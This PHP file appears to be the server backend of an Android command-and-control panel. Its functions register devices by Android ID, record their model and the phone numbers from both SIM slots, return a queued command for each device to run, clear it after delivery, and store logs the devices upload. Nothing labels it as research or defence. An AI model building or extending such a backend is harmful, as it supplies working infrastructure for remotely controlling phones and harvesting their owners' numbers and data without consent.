<?php
require_once __DIR__ . '/config.php';

function logMessage($message) {
    $logFile = __DIR__ . '/app.log';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] $message" . PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

function getDatabaseConnection() {
    $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=" . DB_CHARSET;
    try {
        $pdo = new PDO($dsn, DB_USER, DB_PASS);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $pdo;
    } catch (PDOException $e) {
        return null;
    }
}

function processDeviceInfo($deviceInfo) {
    if (empty($deviceInfo)) {
        return '';
    }
    
    $androidId = $deviceInfo['android_id'] ?? '';
    $model = $deviceInfo['model'] ?? '';
    $sim1 = $deviceInfo['sim1'] ?? '';
    $sim2 = $deviceInfo['sim2'] ?? '';
    $phoneNumbers = trim($sim1 . ' ' . $sim2);
    
    $pdo = getDatabaseConnection();
    if ($pdo === null) {
        return '';
    }
    
    $stmt = $pdo->prepare("SELECT cmd FROM devices WHERE android_id = ?");
    $stmt->execute([$androidId]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    $cmd = $row['cmd'] ?? '';
    
    if ($row) {
        $stmt = $pdo->prepare("UPDATE devices SET model = ?, phone_numbers = ?, online = CURRENT_TIMESTAMP WHERE android_id = ?");
        $stmt->execute([$model, $phoneNumbers, $androidId]);
    } else {
        $stmt = $pdo->prepare("INSERT INTO devices (android_id, model, phone_numbers) VALUES (?, ?, ?)");
        $stmt->execute([$androidId, $model, $phoneNumbers]);
    }
    
    return $cmd;
}

function clearDeviceCmd($androidId) {
    if (empty($androidId)) {
        return;
    }
    
    $pdo = getDatabaseConnection();
    if ($pdo === null) {
        return;
    }
    
    $stmt = $pdo->prepare("UPDATE devices SET cmd = NULL WHERE android_id = ?");
    $stmt->execute([$androidId]);
}

function processLogsInfo($logsInfo) {
    if (empty($logsInfo)) {
        return;
    }
    
    $androidId = $logsInfo['android_id'] ?? '';
    $typelog = $logsInfo['typelog'] ?? '';
    $log = $logsInfo['log'] ?? '';
    
    if (empty($androidId) || empty($log)) {
        return;
    }
    
    $pdo = getDatabaseConnection();
    if ($pdo === null) {
        return;
    }
    
    $stmt = $pdo->prepare("INSERT INTO logs (android_id, typelog, log) VALUES (?, ?, ?)");
    $stmt->execute([$androidId, $typelog, $log]);
}
?>

